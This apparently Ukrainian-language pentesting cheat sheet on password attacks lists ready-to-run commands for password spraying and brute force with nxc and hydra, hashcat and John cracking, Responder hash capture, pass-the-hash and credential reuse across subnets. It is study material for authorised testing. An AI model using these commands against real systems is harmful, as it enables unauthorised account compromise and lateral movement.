# Password Attacks

## Спрей / брут сервісів
```bash
nxc smb <IP> -u users.txt -p 'Welcome1' --continue-on-success
nxc smb <subnet>/24 -u users.txt -p passwords.txt --continue-on-success
hydra -L users.txt -P pass.txt ssh://<IP>
hydra -L users.txt -P pass.txt ftp://<IP>
# RDP (повільно — не частіше 1 спроби/сек):
hydra -L users.txt -P pass.txt rdp://<IP> -t 1
```
**Увага:** Password Spraying = 1 пароль по всіх юзерах, щоб не залочити акаунти.

---

## Hashcat — таблиця режимів

| Mode | Тип хешу | Де зустрічається |
|------|----------|------------------|
| 0    | MD5      | веб-застосунки   |
| 100  | SHA1     | веб-застосунки   |
| 1000 | NTLM     | SAM, NTDS, secretsdump |
| 5600 | NTLMv2 (NetNTLMv2) | Responder, NTLM relay |
| 13100 | Kerberos TGS-REP (RC4) | Kerberoasting |
| 18200 | Kerberos AS-REP (RC4) | AS-REP Roasting |
| 7300 | IPMI2 RAKP HMAC-SHA1 | IPMI enum |
| 1800 | sha512crypt ($6$) | Linux /etc/shadow |
| 500  | md5crypt ($1$) | Linux /etc/shadow |
| 3200 | bcrypt ($2*$) | Linux /etc/shadow |
| 1500 | DES (descrypt) | старі Linux |
| 13400 | KeePass | .kdbx файли |

```bash
# Базовий запуск:
hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt
# З правилами (best64 — баланс швидкість/покриття):
hashcat -m <mode> hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# Crack NTLM з правилами:
hashcat -m 1000 ntlm.txt rockyou.txt -r best64.rule --force
# Відновити сесію:
hashcat --restore
```

---

## John the Ripper
```bash
john --wordlist=rockyou.txt hash.txt
john --wordlist=rockyou.txt --rules hash.txt
john --show hash.txt
# Перетворення форматів:
ssh2john id_rsa > id_rsa.hash && john id_rsa.hash --wordlist=rockyou.txt
zip2john archive.zip > zip.hash && john zip.hash --wordlist=rockyou.txt
```

---

## Кастомні wordlists

```bash
# CeWL — зі сторінки цілі (назви, слова, терміни):
cewl http://<IP> -d 3 -m 5 -w custom.txt
# Username Anarchy — варіації імен:
./username-anarchy John Smith > users.txt
# Комбінація CeWL + правила:
hashcat -m 1000 hash.txt custom.txt -r best64.rule
```

---

## Хеші з NTLMv2 (Responder)
```bash
# Запуск Responder (захоплення):
sudo responder -I <interface> -dPv
# Крекінг:
hashcat -m 5600 responder_hashes.txt rockyou.txt -r best64.rule
```

---

## Pass-the-Hash (NTLM)
```bash
# Не крекаємо — використовуємо хеш напряму:
evil-winrm -i <IP> -u <user> -H <NTLM-hash>
impacket-psexec <domain>/<user>@<IP> -hashes :<NTLM>
nxc smb <IP> -u <user> -H <NTLM>
```

---

## Credential Stuffing / Reuse
```bash
# Перевір знайдені паролі по всіх хостах/сервісах:
nxc smb <subnet>/24 -u <user> -p '<found-pass>' -d <domain>
nxc smb <subnet>/24 -u users.txt -p '<found-pass>' --continue-on-success
# Одна пара кредів може працювати на SSH, FTP, WinRM, RDP — перевіряй все
```

**Зв'язки:** [[Credentials]] · [[Kerberoast-ASREP]] · [[NTLM-Relay]] · [[Credential-Dumping]]
